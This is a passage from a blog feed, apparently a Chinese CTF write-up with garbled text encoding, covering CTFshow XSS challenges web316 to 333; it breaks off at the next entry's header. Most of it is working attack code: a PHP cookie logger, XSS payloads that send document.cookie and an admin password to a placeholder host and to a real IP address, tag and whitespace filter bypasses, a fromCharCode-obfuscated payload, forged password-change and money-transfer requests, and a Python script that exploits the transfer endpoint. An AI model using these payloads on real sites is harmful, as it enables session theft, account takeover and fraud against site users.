punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d h:i:s'</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cookie.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">,</span><span class="token variable">$time</span><span class="token operator">.</span><span class="token string single-quoted-string">':    '</span><span class="token operator">.</span> <span class="token variable">$cookie</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://xxxxxx/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>cookie.txté‡Œé¢å°±å¯ä»¥çœ‹åˆ°flagï¼Œæˆ–è€…æŸ¥çœ‹æ—¥å¿—</p><h4 id="web317-img"><a href="#web317-img" class="headerlink" title="web317(img)"></a>web317(img)</h4><p>è¿‡æ»¤äº†<code>script</code>å¯ä»¥ä½¿ç”¨<code>img</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">""</span> onerror<span class="token operator">=</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://xxxxxx/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie <span class="token operator">></span></code></pre><h4 id="web318-body-iframe"><a href="#web318-body-iframe" class="headerlink" title="web318(body iframe)"></a>web318(body iframe)</h4><p>è¿‡æ»¤äº†<code>img</code>ä½¿ç”¨<code>body</code>æˆ–è€…<code>iframe</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body onload<span class="token operator">=</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://xxxxxxx/xss/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">></span><span class="token operator">&lt;</span>iframe Î¿nlÎ¿ad<span class="token operator">=</span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://xxxxxxx/xss/cookie.php?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">></span></code></pre><h4 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h4><p>åŒ318</p><h4 id="web320-326-ç©ºæ ¼ç»•è¿‡-fromCharCode"><a href="#web320-326-ç©ºæ ¼ç»•è¿‡-fromCharCode" class="headerlink" title="web320-326(ç©ºæ ¼ç»•è¿‡  fromCharCode)"></a>web320-326(ç©ºæ ¼ç»•è¿‡  fromCharCode)</h4><p>è¿‡æ»¤äº†<code>script</code>ï¼Œ<code>img</code>ï¼Œ<code>  </code>, <code>iframe</code>ã€‚</p><p>web322è¿‡æ»¤äº†xss</p><p>ç©ºæ ¼å¯ä»¥ç”¨<code>%09</code>ã€<code>tab</code>ã€<code>/</code>ã€<code>/**/</code>ã€<code>%0a</code>ä»£æ›¿ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body<span class="token comment">/**/</span>onload<span class="token operator">=</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://xxxxxxx/xss/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">></span><span class="token operator">&lt;</span>iframe<span class="token comment">/**/</span>Î¿nlÎ¿ad<span class="token operator">=</span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://xxxxxxx/xss/cookie.php?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">></span></code></pre><p>æ‰©å±•ä¸€ä¸‹payloadï¼š</p><p>String.fromCharCode()å‡½æ•°ï¼šasciiç è½¬å­—ç¬¦</p><p>å‚è€ƒï¼š<a href="https://www.runoob.com/jsref/jsref-fromcharcode.html">https://www.runoob.com/jsref/jsref-fromcharcode.html</a></p><p>String.fromCharCode(111,110,108,111,97,100); æ§åˆ¶å°è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="web%E5%85%A5%E9%97%A8-xss%5Cweb320.png" loading="lazy"></p><p>ç”¨å®ƒæˆ‘å¯ä»¥æ„é€ ä¸€ä¸ªpayloadï¼š</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body<span class="token comment">/**/</span>Î¿nlÎ¿ad<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">54</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://117.72.70.186/xss/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>String2ascii.py</p><pre class="language-python" data-language="python"><code class="language-python">input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥å­—ç¬¦ä¸²: "</span><span class="token punctuation">)</span>  <span class="token comment"># è·å–ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²</span>ascii_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment"># éå†å­—ç¬¦ä¸²ï¼Œå°†æ¯ä¸ªå­—ç¬¦è½¬æ¢ä¸ºASCIIç ï¼Œå¹¶æ·»åŠ åˆ°åˆ—è¡¨ä¸­</span><span class="token keyword">for</span> char <span class="token keyword">in</span> input_str<span class="token punctuation">:</span>    ascii_code <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>  <span class="token comment"># ä½¿ç”¨ord()å‡½æ•°è·å–å­—ç¬¦çš„ASCIIç </span>    ascii_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ascii_code<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># å°†ASCIIç è½¬æ¢ä¸ºå­—ç¬¦ä¸²å¹¶æ·»åŠ åˆ°åˆ—è¡¨</span><span class="token comment"># å°†åˆ—è¡¨ä¸­çš„ASCIIç ç”¨é€—å·éš”å¼€ï¼Œå¹¶æ‰“å°ç»“æœ</span>result <span class="token operator">=</span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ascii_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"è½¬æ¢åçš„ASCIIç :"</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span></code></pre><p>Ascii2string.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">ascii_to_string</span><span class="token punctuation">(</span>ascii_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># å°†ä»¥é€—å·åˆ†éš”çš„ASCIIç å­—ç¬¦ä¸²åˆ†å‰²æˆä¸€ä¸ªåˆ—è¡¨</span>    ascii_list <span class="token operator">=</span> ascii_str<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    <span class="token comment"># ä½¿ç”¨åˆ—è¡¨æ¨å¯¼å¼å°†ASCIIç è½¬æ¢ä¸ºå­—ç¬¦ï¼Œå¹¶è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²</span>    result <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> code <span class="token keyword">in</span> ascii_list<span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token comment"># è¾“å…¥ä»¥é€—å·åˆ†éš”çš„ASCIIç å­—ç¬¦ä¸²</span>ascii_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥ä»¥é€—å·åˆ†éš”çš„ASCIIç å­—ç¬¦ä¸²: "</span><span class="token punctuation">)</span><span class="token comment"># è°ƒç”¨å‡½æ•°è¿›è¡Œè½¬æ¢å¹¶æ‰“å°ç»“æœ</span>string_result <span class="token operator">=</span> ascii_to_string<span class="token punctuation">(</span>ascii_str<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"è½¬æ¢åçš„å­—ç¬¦ä¸²:"</span><span class="token punctuation">,</span> string_result<span class="token punctuation">)</span></code></pre><h4 id="web327-å­˜å‚¨å‹xss"><a href="#web327-å­˜å‚¨å‹xss" class="headerlink" title="web327(å­˜å‚¨å‹xss)"></a>web327(å­˜å‚¨å‹xss)</h4><p>è™½ç„¶ä½†æ˜¯ï¼Œè¿˜æ˜¯ä¹‹å‰çš„payloadï¼Œæ”¶ä»¶äººå¿…é¡»æ˜¯admin</p><h4 id="web328-ä¼ªé€ Cookie"><a href="#web328-ä¼ªé€ Cookie" class="headerlink" title="web328(ä¼ªé€ Cookie)"></a>web328(ä¼ªé€ Cookie)</h4><p>å…ˆæå‰ç›‘å¬5010ç«¯å£ï¼Œç„¶ååœ¨æ³¨å†Œç”¨æˆ·çš„æ—¶å€™æ³¨å…¥payloadï¼Œåå¼¹ç®¡ç†å‘˜çš„cookie</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://117.72.70.186:5010/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>è¿™æ ·å¾—åˆ°adminçš„cookieè¿›è¡Œä¼ªé€ æŸ¥çœ‹ç”¨æˆ·å³å¯å¾—åˆ°flag</p><h4 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h4><p>å’Œä¸Šé¢˜ä¸åŒçš„æ˜¯ï¼ŒCookieä¼šç«‹åˆ»å¤±æ•ˆã€‚ä¸èƒ½é€šè¿‡çªƒå–Cookieçš„å½¢å¼å¾—åˆ°flagäº†ã€‚</p><p>æˆ‘ä»¬åˆ†æä¸€ä¸‹åŸç†ï¼Œæˆ‘ä»¬çš„payloadä½œä¸ºå‚¨å­˜å‹XSSï¼Œç®¡ç†å‘˜è®¿é—®æ—¶å€™èƒ½è¢«æˆ‘ä»¬çªƒå–Cookieï¼Œé‚£æ˜¯ä¸æ˜¯è¿˜èƒ½çªƒå–ç‚¹åˆ«çš„ä¸œè¥¿å‘¢ï¼Œæ¯”å¦‚è¯´ç®¡ç†å‘˜çœ‹åˆ°çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ç†è®ºä¸Šæ¥è¯´æ˜¯å¯ä»¥çš„ï¼Œæ‰€ä»¥å°±ç›´æ¥è·å–ç®¡ç†å‘˜çš„é¡µé¢ä¿¡æ¯ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç±»åæŸ¥æ‰¾å…ƒç´ ï¼Œé€šè¿‡documentæ¥è·å–ã€‚</p><p>ç°åœ¨æœåŠ¡å™¨ä¸Šé¢ç›‘å¬ç«¯å£5010ã€‚</p><p>innerHTMLå’ŒouterHTMLçš„åŒºåˆ«</p><blockquote><p>1ã€innerHTML:<br>ã€€ã€€ä»å¯¹è±¡çš„èµ·å§‹ä½ç½®åˆ°ç»ˆæ­¢ä½ç½®çš„å…¨éƒ¨å†…å®¹,ä¸åŒ…æ‹¬Htmlæ ‡ç­¾ã€‚<br>innerTextå¯æ›¿ä»£innerHTML</p><p>2ã€outerHTML:<br>ã€€ã€€é™¤äº†åŒ…å«innerHTMLçš„å…¨éƒ¨å†…å®¹å¤–, è¿˜åŒ…å«å¯¹è±¡æ ‡ç­¾æœ¬èº«ã€‚</p></blockquote><p><img src="web329.png" alt="img" loading="lazy"></p><p>å¯ä»¥çœ‹åˆ°å‰ç«¯ä»£ç ä¸­å°†è¦æ˜¾ç¤ºadminå¯†ç çš„åœ°æ–¹ç±»ä¸º<code>layui-table-cell laytable-cell-1-0-1</code></p><p>payloadï¼š </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://117.72.70.186:5010/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span><span class="token function">getElementsByClassName</span><span class="token punctuation">(</span><span class="token string">'layui-table-cell laytable-cell-1-0-1'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>è§£é‡Šä¸€ä¸‹å®ƒçš„æ¯ä¸€éƒ¨åˆ†ï¼š</p><blockquote><p><code>window.open(&#39;http://117.72.70.186:5010/&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML)</code>è¿™æ˜¯ä¸€ä¸ªè°ƒç”¨ window.open() å‡½æ•°çš„è¯­å¥ï¼Œç”¨äºæ‰“å¼€æ–°çš„æµè§ˆå™¨çª—å£ã€‚<br><code>&#39;http://117.72.70.186:5010/&#39;</code> è¿™æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¦æ‰“å¼€çš„ç½‘é¡µçš„ URLã€‚å®ƒåŒ…æ‹¬äº†åè®®ï¼ˆhttp:&#x2F;&#x2F;ï¼‰ã€ä¸»æœºåï¼ˆ120.46.41.173ï¼‰å’Œç«¯å£å·ï¼ˆ9023ï¼‰ï¼Œä»¥åŠè·¯å¾„ï¼ˆåé¢çš„æ–œæ  &#x2F;ï¼‰ã€‚<br><code>document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML</code> è¿™æ˜¯ä¸€ç³»åˆ— DOM æ“ä½œï¼Œç”¨äºè·å–ç½‘é¡µä¸­ç‰¹å®šå…ƒç´ çš„å†…å®¹ã€‚<br><code>document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)</code> æ˜¯ä¸€ä¸ªé€šè¿‡ç±»åæŸ¥æ‰¾å…ƒç´ çš„æ–¹æ³•ã€‚å®ƒæŸ¥æ‰¾å…·æœ‰ç±»å <code>&#39;layui-table-cell&#39;</code> å’Œ <code>&#39;laytable-cell-1-0-1&#39;</code> çš„å…ƒç´ ï¼Œé€šå¸¸è¿™æ˜¯ä¸€ç§é’ˆå¯¹è¡¨æ ¼å•å…ƒæ ¼çš„é€‰æ‹©ã€‚<br><code>[1]</code> è¡¨ç¤ºä»åŒ¹é…çš„å…ƒç´ åˆ—è¡¨ä¸­é€‰æ‹©ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆJavaScript ä¸­çš„æ•°ç»„ç´¢å¼•ä» 0 å¼€å§‹ï¼‰ã€‚<br><code>.innerHTML</code> ç”¨äºè·å–é€‰å®šå…ƒç´ çš„ HTML å†…å®¹ï¼Œä¹Ÿå°±æ˜¯åœ¨è¿™ä¸ªè¡¨æ ¼å•å…ƒæ ¼ä¸­æ˜¾ç¤ºçš„æ–‡æœ¬æˆ– HTMLã€‚</p></blockquote><p><img src="web329_2.png" loading="lazy"></p><h4 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h4><p>å¤šäº†ä¸€ä¸ªä¿®æ”¹å¯†ç ï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†<code>api/change.php</code>å‚æ•°påˆ™æ˜¯æˆ‘ä»¬ä¿®æ”¹çš„å¯†ç </p><p><img src="web330.png" loading="lazy"></p><p>æˆ‘ä»¬å¯ä»¥ä¼ªé€ adminçš„cookieæ¥å»ä¿®æ”¹å¯†ç ï¼Œä½†cookieæ˜¯æš‚æ—¶çš„ï¼Œæ‰€ä»¥åˆ©ç”¨xssä¸»åŠ¨å»æ”¹</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://127.0.0.1/api/change.php?p=111'</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>ç„¶åç™»å½•adminå°±å¯ä»¥äº†</p><h4 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h4><p>å’Œä¸Šé¢˜ç±»ä¼¼ï¼Œæˆ‘ä»¬å…ˆæŠ“åŒ…åˆ†æã€‚è¿™æ¬¡ä¿®æ”¹å¯†ç å˜æˆäº†POSTè¯·æ±‚ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">"api/change.php"</span><span class="token punctuation">,</span><span class="token literal-property property">method</span><span class="token operator">:</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">'p'</span><span class="token operator">:</span><span class="token string">'111'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h4 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h4><p>è¿™æ¬¡å¤šäº†å¯ä»¥è½¬è´¦çš„åŠŸèƒ½</p><p>è¯´æ˜¯å¯ä»¥å‘åˆ«äººè½¬è´Ÿæ•°ï¼Œä½†æ˜¯æˆ‘è¿™å„¿å°±æ˜¯æœ‰å†…é¬¼ï¼Œåœæ­¢äº¤æ˜“ğŸ˜…</p><p>æ‰€ä»¥åˆ©ç”¨xss</p><blockquote><p>jqueryçš„è¿™ä¸ªajaxä¸èƒ½æºå¸¦cookieè¯·æ±‚ï¼Œæ‰€ä»¥æœ‰ç‚¹éº»çƒ¦ï¼Œä½†æ˜¯å¦‚æœæ˜¯æœ¬åœ°è¯·æ±‚å°±åˆšå¥½ç»•è¿‡äº†è¿™ä¸€ç‚¹</p></blockquote><pre class="language-javascript" data-language="javascript"><code class="language-javascript">$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"http://127.0.0.1/api/amount.php"</span><span class="token punctuation">,</span><span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">'u'</span><span class="token operator">:</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token string-property property">'a'</span><span class="token operator">:</span><span class="token number">10000</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://117.72.70.186/xs5/post.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>åœ¨æ³¨å†Œç•Œé¢å¡«å…¥payload</p><p>ç„¶åæ‰¾ä¸ªtestè´¦å·æ”¶é’±</p><h4 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h4><p>332çš„æ–¹æ³•ç…§æ ·å¯ä»¥</p><p>ä¹Ÿå¯ä»¥è½¬è´¦ç»™è‡ªå·±ï¼Œè€Œä¸”å¾—ä¿è¯è‡ªå·±æœ€ä½æœ‰1å—é’±ï¼Œå†™ä¸ªè„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> timex<span class="token operator">=</span><span class="token number">5</span>url<span class="token operator">=</span><span class="token string">"http://f6d9355e-3521-4f14-b1f7-c6bbe137790d.challenge.ctf.show/api/amount.php"</span>url2<span class="token operator">=</span><span class="token string">"http://f6d9355e-3521-4f14-b1f7-c6bbe137790d.challenge.ctf.show/api/getFlag.php"</span>headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span><span class="token string">'PHPSESSID=3o54ih5njfm1hh1ccnet28e59b'</span><span class="token punctuation">&#125;</span>  <span class="token comment">#è‡ªå·±ç™»å½•åçš„sessionid</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    t<span class="token operator">=</span>x<span class="token operator">-</span><span class="token number">1</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'u'</span><span class="token punctuation">:</span><span class="token string">'hsad'</span><span class="token punctuation">,</span> <span class="token comment">#æ³¨å†Œçš„ç”¨æˆ·å</span>    <span class="token string">'a'</span><span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">></span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r2<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r2<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span>    x<span class="token operator">+=</span>t</code></pre>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-Java</title>
      <link href="/2024/07/18/web%E5%85%A5%E9%97%A8-Java/"/>
      <url>/2024/07/18/web%E5%85%A5%E9%97%A8-Java/</url>
      
